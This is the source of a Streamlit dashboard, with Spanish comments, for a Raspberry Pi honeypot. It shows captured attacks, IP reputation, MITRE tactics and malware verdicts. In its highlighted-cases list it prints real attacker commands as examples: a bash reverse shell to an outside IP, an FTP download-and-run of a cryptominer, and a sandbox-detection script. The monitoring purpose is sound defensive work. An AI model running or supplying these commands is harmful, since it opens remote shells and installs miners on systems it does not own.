import streamlit as st
import json
import pandas as pd
import os
import time
import plotly.express as px
import plotly.graph_objects as go

st.set_page_config(page_title="HoneyPI SOC Lab", page_icon="🛡️", layout="wide")

# =========================================================
#  ESTETICA "SOC PROFESIONAL" (estilo QRadar/Splunk): fondo oscuro
#  azulado, tarjetas con borde redondeado, acentos de color por categoria
# =========================================================
COLOR_FONDO = "#12141c"
COLOR_TARJETA = "#1a1d2b"
COLOR_BORDE = "#2a2e42"
COLOR_TEXTO = "#e4e6ef"
COLOR_TEXTO_SEC = "#9296ab"
PALETA = ["#4fd8c4", "#8b7cf6", "#ec6ba0", "#f5c518", "#3b9dfd", "#f97316", "#34d399"]

st.markdown(
    f"""
    <style>
        .stApp {{
            background-color: {COLOR_FONDO};
            color: {COLOR_TEXTO};
        }}
        h1, h2, h3, h4 {{
            color: {COLOR_TEXTO} !important;
            font-weight: 600;
        }}
        p, li, span, label {{
            color: {COLOR_TEXTO_SEC} !important;
        }}
        [data-testid="stMetricValue"] {{
            color: {COLOR_TEXTO} !important;
            font-size: 1.8rem !important;
            font-weight: 700 !important;
        }}
        [data-testid="stMetricLabel"] {{
            color: {COLOR_TEXTO_SEC} !important;
            text-transform: uppercase;
            font-size: 0.75rem !important;
            letter-spacing: 0.05em;
        }}
        [data-testid="stMetric"] {{
            background-color: {COLOR_TARJETA};
            border: 1px solid {COLOR_BORDE};
            border-radius: 10px;
            padding: 14px 16px;
        }}
        div[data-testid="stVerticalBlockBorderWrapper"] {{
            background-color: {COLOR_TARJETA};
            border: 1px solid {COLOR_BORDE} !important;
            border-radius: 12px;
        }}
        section[data-testid="stSidebar"] {{
            background-color: #0d0f17;
            border-right: 1px solid {COLOR_BORDE};
        }}
        .stDataFrame {{
            background-color: {COLOR_TARJETA} !important;
        }}
        hr {{ border-color: {COLOR_BORDE} !important; }}
        a {{ color: #3b9dfd !important; }}
        .live-dot {{
            display: inline-block;
            width: 8px; height: 8px;
            background-color: #34d399;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 1.6s infinite;
        }}
        @keyframes pulse {{
            0% {{ opacity: 1; }} 50% {{ opacity: 0.3; }} 100% {{ opacity: 1; }}
        }}
    </style>
    """,
    unsafe_allow_html=True,
)


def grafico_donut(series, titulo, colores=PALETA):
    """Grafico de dona estilo SOC, con fondo transparente para integrarse al tema oscuro."""
    fig = go.Figure(data=[go.Pie(
        labels=series.index.tolist(),
        values=series.values.tolist(),
        hole=0.62,
        marker=dict(colors=colores),
        textfont=dict(color=COLOR_TEXTO, size=12),
    )])
    fig.update_layout(
        title=dict(text=titulo, font=dict(color=COLOR_TEXTO, size=14)),
        paper_bgcolor="rgba(0,0,0,0)",
        plot_bgcolor="rgba(0,0,0,0)",
        legend=dict(font=dict(color=COLOR_TEXTO_SEC, size=11)),
        margin=dict(t=40, b=10, l=10, r=10),
        height=320,
    )
    return fig


def grafico_barras(series, titulo="", color=PALETA[0]):
    fig = px.bar(x=series.index, y=series.values, color_discrete_sequence=[color])
    fig.update_layout(
        title=dict(text=titulo, font=dict(color=COLOR_TEXTO, size=14)),
        paper_bgcolor="rgba(0,0,0,0)",
        plot_bgcolor="rgba(0,0,0,0)",
        font=dict(color=COLOR_TEXTO_SEC),
        xaxis=dict(gridcolor=COLOR_BORDE, title=""),
        yaxis=dict(gridcolor=COLOR_BORDE, title=""),
        margin=dict(t=40, b=10, l=10, r=10),
        height=300,
    )
    return fig


# --- Rutas relativas al repo ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

HISTORIAL_PATH = os.path.join(DATA_DIR, "incidentes.json")
IPS_ENRIQUECIDAS_PATH = os.path.join(DATA_DIR, "ips_enriquecidas.json")
PAYLOADS_PATH = os.path.join(DATA_DIR, "payloads_capturados.json")
ESTADO_HW_PATH = os.path.join(DATA_DIR, "estado_hardware.json")

# =========================================================
#  CARGA DE DATOS
# =========================================================
estado_hw = {}
if os.path.exists(ESTADO_HW_PATH):
    try:
        with open(ESTADO_HW_PATH, "r") as f:
            estado_hw = json.load(f)
    except Exception:
        pass

df = pd.DataFrame()
if os.path.exists(HISTORIAL_PATH):
    try:
        with open(HISTORIAL_PATH, "r") as f:
            datos = json.load(f)
        df = pd.DataFrame(datos)
        if not df.empty:
            df = df.iloc[::-1].reset_index(drop=True)
    except Exception:
        pass

ips_data = {}
if os.path.exists(IPS_ENRIQUECIDAS_PATH):
    try:
        with open(IPS_ENRIQUECIDAS_PATH, "r") as f:
            ips_data = json.load(f)
    except Exception:
        pass

payloads = []
if os.path.exists(PAYLOADS_PATH):
    try:
        with open(PAYLOADS_PATH, "r") as f:
            payloads = json.load(f)
    except Exception:
        pass

# =========================================================
#  SIDEBAR: mapa + accesos
# =========================================================
with st.sidebar:
    st.markdown("### 🛡️ HoneyPI SOC")
    st.markdown('<span class="live-dot"></span>**En vivo**', unsafe_allow_html=True)
    st.caption("Espejo público de solo lectura · sync cada 30 min")

    st.markdown("---")
    st.markdown("**Ubicación de atacantes**")
    mapa_puntos = []
    for ip, info in ips_data.items():
        geo = info.get("geolocalizacion", {})
        lat, lon = geo.get("lat"), geo.get("lon")
        if lat is not None and lon is not None:
            mapa_puntos.append({"lat": lat, "lon": lon})
    if mapa_puntos:
        st.map(pd.DataFrame(mapa_puntos), zoom=0, use_container_width=True)
    else:
        st.caption("Sin datos de geolocalización todavía.")

    st.markdown("---")
    st.markdown(
        """
        <div style="font-size: 0.8em; opacity: 0.9;">
        📖 <a href="https://www.linkedin.com/pulse/honeypi-un-soc-casero-con-ia-local-cap%C3%ADtulo-1-pablo-rattin-ntrwf/" target="_blank">Cómo se armó →</a><br><br>
        🔗 <a href="https://www.linkedin.com/in/pablorattin" target="_blank">LinkedIn</a> ·
        <a href="https://praxiscybersecurity.com" target="_blank">Praxis Cybersecurity</a>
        </div>
        """,
        unsafe_allow_html=True,
    )

# =========================================================
#  HEADER + BARRA DE KPIs (estilo "Overview" de QRadar)
# =========================================================
st.markdown("## 🛡️ HoneyPI — SOC Lab")
st.caption("Honeypot + IA en Raspberry Pi 5 · Monitoreo en tiempo real")

auto_refresh = st.checkbox("Auto-actualizar cada 30s")

total_eventos = len(df) if not df.empty else 0
ips_unicas = df["ip_origen"].nunique() if not df.empty and "ip_origen" in df.columns else 0
protocolo_top = df["servicio"].value_counts().idxmax() if not df.empty and "servicio" in df.columns else "N/A"

k1, k2, k3, k4, k5 = st.columns(5)
with k1:
    st.metric("Eventos totales", total_eventos)
with k2:
    st.metric("IPs únicas", ips_unicas)
with k3:
    st.metric("Payloads capturados", len(payloads))
with k4:
    st.metric("Protocolo más atacado", protocolo_top)
with k5:
    st.metric("Temp. CPU", estado_hw.get("temperatura", "N/A"))

st.markdown("---")

# =========================================================
#  FILA: Casos destacados + Donut de severidad
# =========================================================
col_izq, col_der = st.columns([1.3, 1])

with col_izq:
    with st.container(border=True):
        st.markdown("#### ⭐ Casos destacados")
        CASOS_DESTACADOS = [
            {
                "titulo": "🔓 Reverse Shell hacia servidor externo",
                "comando": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
                "descripcion": "Técnica clásica de post-explotación: apertura de shell interactiva reversa hacia un servidor de control remoto (puerto 4444, típico de Metasploit/netcat).",
            },
            {
                "titulo": "⛏️ Descarga de criptominer vía FTP",
                "comando": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
                "descripcion": "Patrón de botnet IoT (Mirai/Gafgyt): descarga vía FTP con fallback a BusyBox. Confirmado por YARA (XMRig_Miner) y VirusTotal (41/65 motores).",
            },
            {
                "titulo": "🕵️ Autodetección de honeypot",
                "comando": '/usr/bin/bash -c printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter',
                "descripcion": "El atacante crea, ejecuta y borra un script de prueba para verificar permisos reales — técnica de evasión de sandboxes.",
            },
        ]
        for caso in CASOS_DESTACADOS:
            with st.expander(caso["titulo"]):
                st.code(caso["comando"], language="bash")
                st.write(caso["descripcion"])

with col_der:
    with st.container(border=True):
        if not df.empty and "severidad" in df.columns:
            df_sev = df[df["severidad"].notna() & (df["severidad"] != "N/A")]
            if not df_sev.empty:
                st.plotly_chart(
                    grafico_donut(df_sev["severidad"].value_counts(), "Eventos por Severidad"),
                    use_container_width=True,
                )
            else:
                st.info("Todavía no hay eventos con severidad clasificada.")
        elif not df.empty and "servicio" in df.columns:
            st.plotly_chart(
                grafico_donut(df["servicio"].value_counts(), "Ataques por Protocolo"),
                use_container_width=True,
            )
        else:
            st.info("Sin datos suficientes todavía.")

st.markdown("---")

# =========================================================
#  ESTADISTICAS
# =========================================================
if not df.empty:
    st.markdown("#### 📊 Estadísticas de ataques")

    e1, e2 = st.columns(2)
    with e1:
        with st.container(border=True):
            if "ip_origen" in df.columns:
                st.plotly_chart(
                    grafico_barras(df["ip_origen"].value_counts().head(10), "Top 10 IPs atacantes", PALETA[1]),
                    use_container_width=True,
                )
    with e2:
        with st.container(border=True):
            if "comando" in df.columns:
                st.plotly_chart(
                    grafico_barras(df["comando"].value_counts().head(10), "Top 10 comandos ejecutados", PALETA[2]),
                    use_container_width=True,
                )

    h1, h2 = st.columns(2)
    with h1:
        with st.container(border=True):
            if "timestamp" in df.columns:
                try:
                    horas = pd.to_datetime(df["timestamp"], format="%Y-%m-%d %H:%M:%S").dt.hour
                    conteo_horas = horas.value_counts().reindex(range(24), fill_value=0)
                    conteo_horas.index = [f"{h:02d}h" for h in conteo_horas.index]
                    st.plotly_chart(
                        grafico_barras(conteo_horas, "¿A qué hora atacan más?", PALETA[3]),
                        use_container_width=True,
                    )
                    hora_pico = horas.value_counts().idxmax()
                    st.caption(f"Hora con más actividad: {hora_pico:02d}:00 (hora del servidor)")
                except Exception:
                    st.info("No se pudo calcular el mapa de calor horario.")
    with h2:
        with st.container(border=True):
            if "mitre_tactic" in df.columns:
                df_mitre = df[df["mitre_tactic"].notna() & (df["mitre_tactic"] != "N/A")]
                if not df_mitre.empty:
                    st.plotly_chart(
                        grafico_donut(df_mitre["mitre_tactic"].value_counts(), "Tácticas MITRE ATT&CK"),
                        use_container_width=True,
                    )
                else:
                    st.info("Todavía no hay eventos con clasificación MITRE.")

    if "mitre_technique" in df.columns:
        df_mitre = df[df["mitre_technique"].notna() & (df["mitre_technique"] != "N/A")]
        if not df_mitre.empty:
            with st.container(border=True):
                st.markdown("**Top técnicas MITRE detectadas**")
                st.dataframe(
                    df_mitre["mitre_technique"].value_counts().reset_index().rename(
                        columns={"mitre_technique": "Técnica", "count": "Eventos"}
                    ),
                    width='stretch',
                    hide_index=True,
                )

    if "analisis" in df.columns:
        with st.container(border=True):
            st.markdown("#### 💰 Costo estimado del pipeline de IA")
            try:
                analizados = df[
                    ~df["analisis"].astype(str).str.startswith("[Repetido")
                    & ~df["analisis"].astype(str).str.startswith("[Circuit")
                ]
                cantidad_analizados = len(analizados)
                tokens_entrada = cantidad_analizados * 150
                tokens_salida = cantidad_analizados * 120
                costo = (tokens_entrada / 1_000_000) * 1.0 + (tokens_salida / 1_000_000) * 5.0

                co1, co2, co3 = st.columns(3)
                with co1:
                    st.metric("Consultas a la API", cantidad_analizados)
                with co2:
                    st.metric("Tokens estimados", f"{tokens_entrada + tokens_salida:,}")
                with co3:
                    st.metric("Costo estimado (USD)", f"${costo:.4f}")
                st.caption("Estimación aproximada (Claude Haiku 4.5). No incluye consultas omitidas por anti-ráfaga o circuit breaker.")
            except Exception:
                st.info("No se pudo calcular el costo estimado.")
else:
    st.info("⌛ Sin datos de incidentes todavía.")

st.markdown("---")

# =========================================================
#  GEOLOCALIZACION / REPUTACION
# =========================================================
with st.container(border=True):
    st.markdown("#### 🌎 Geolocalización y reputación de IPs")
    if ips_data:
        filas = []
        for ip, info in ips_data.items():
            abuse = info.get("abuseipdb", {})
            geo = info.get("geolocalizacion", {})
            filas.append({
                "IP": ip,
                "País": geo.get("pais", "N/A"),
                "Ciudad": geo.get("ciudad", "N/A"),
                "ISP / Org": abuse.get("isp") or geo.get("org", "N/A"),
                "Score Abuso (%)": abuse.get("abuse_confidence_score", "N/A"),
                "Reportes Previos": abuse.get("total_reports", "N/A"),
                "Tipo de Uso": abuse.get("usage_type", "N/A"),
            })
        df_ips = pd.DataFrame(filas)
        st.dataframe(df_ips, width='stretch')

        r1, r2 = st.columns(2)
        with r1:
            score_promedio = df_ips["Score Abuso (%)"].replace("N/A", pd.NA).dropna().astype(float).mean()
            if pd.notna(score_promedio):
                st.metric("Score de abuso promedio", f"{score_promedio:.0f}%")
        with r2:
            st.plotly_chart(
                grafico_donut(df_ips["País"].value_counts(), "Países de origen"),
                use_container_width=True,
            )
    else:
        st.info("⌛ Sin datos de geolocalización todavía.")

st.markdown("---")

# =========================================================
#  PAYLOADS CAPTURADOS
# =========================================================
with st.container(border=True):
    st.markdown("#### 🎯 Payloads reales capturados")
    if payloads:
        st.metric("Total de payloads", len(payloads))
        df_payloads = pd.DataFrame(payloads).iloc[::-1].reset_index(drop=True)
        df_payloads["VirusTotal"] = df_payloads["sha256"].apply(
            lambda h: f"https://www.virustotal.com/gui/file/{h}"
        )

        def _veredicto_vt(fila):
            vt = fila.get("virustotal") if isinstance(fila, dict) else None
            if not isinstance(vt, dict):
                return "⚪ Sin consultar"
            if vt.get("error"):
                return "⚪ Sin consultar"
            if vt.get("conocido") is False:
                return "🟡 Hash no visto antes"
            if vt.get("conocido") is True:
                maliciosos = vt.get("maliciosos", 0)
                total = maliciosos + vt.get("sospechosos", 0) + vt.get("inofensivos", 0) + vt.get("sin_detectar", 0)
                return f"🔴 Malicioso ({maliciosos}/{total})" if maliciosos > 0 else f"🟢 Limpio (0/{total})"
            return "⚪ Sin consultar"

        df_payloads["Veredicto VirusTotal"] = [_veredicto_vt(p) for p in payloads[::-1]]

        def _link_hybrid(fila):
            ha = fila.get("hybrid_analysis") if isinstance(fila, dict) else None
            return ha.get("link") if isinstance(ha, dict) else None

        df_payloads["Hybrid Analysis"] = [_link_hybrid(p) for p in payloads[::-1]]

        def _yara_texto(fila):
            matches = fila.get("yara_matches") if isinstance(fila, dict) else None
            return ", ".join(matches) if matches else "Sin coincidencias"

        df_payloads["YARA"] = [_yara_texto(p) for p in payloads[::-1]]

        columnas_mostrar = ["timestamp", "nombre_archivo", "tamano_bytes", "YARA", "Veredicto VirusTotal", "VirusTotal", "Hybrid Analysis"]
        columnas_disponibles = [c for c in columnas_mostrar if c in df_payloads.columns]
        st.dataframe(
            df_payloads[columnas_disponibles],
            width='stretch',
            column_config={
                "VirusTotal": st.column_config.LinkColumn("VirusTotal", display_text="Ver análisis"),
                "Hybrid Analysis": st.column_config.LinkColumn("Hybrid Analysis", display_text="Ver análisis"),
            },
        )
    else:
        st.info("Todavía no se capturó ningún payload real. La vigilancia sigue activa.")

st.markdown("---")

# =========================================================
#  ULTIMO ANALISIS + HISTORIAL
# =========================================================
if not df.empty:
    with st.container(border=True):
        st.markdown("#### 🔍 Último análisis")
        ultimo = df.iloc[0]
        st.markdown(f"**IP:** `{ultimo.get('ip_origen', 'N/A')}`")
        st.markdown(f"**Comando:** `{ultimo.get('comando', 'N/A')}`")
        st.markdown(f"**Análisis:** {ultimo.get('analisis', 'N/A')}")

    with st.container(border=True):
        st.markdown("#### 🕒 Historial completo")
        st.dataframe(df, width='stretch')

st.markdown("---")
st.caption("Proyecto HoneyPI — honeypot + IA local en Raspberry Pi 5. Código completo en GitHub: github.com/rattinp/soc-lab-raspberry-pi")

if auto_refresh:
    time.sleep(30)
    st.rerun()
